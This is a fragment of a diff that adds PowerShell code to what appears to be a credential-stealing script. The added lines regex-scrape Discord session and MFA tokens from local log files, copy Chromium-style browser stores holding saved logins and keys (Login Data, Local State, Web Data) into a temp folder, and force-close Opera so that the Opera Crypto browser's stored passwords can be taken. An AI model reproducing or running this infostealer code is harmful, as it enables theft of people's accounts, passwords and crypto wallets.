+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
+$log = Get-ChildItem $lvdb\*.log
+foreach ($file in $log) {
+	$file=$file.Name
+	$f="$lvdb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
+$webdata = "$path\Web Data"
+Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $logindata "$env:TMP\$FolderName\$Browser\Login Data"
+Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+
+}
+
+# Get Opera Crypto Passwords
+$path="$env:appdata\Opera Software\Opera Crypto Stable"
+if([System.IO.File]::Exists("$path\Local State")){
+taskkill /IM opera.exe /F
+taskkill /IM launcher.exe /F
+Start-Sleep 1
+$Browser="OperaCrypto"
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\Local State"
 $logindata = "$path\Login Data"
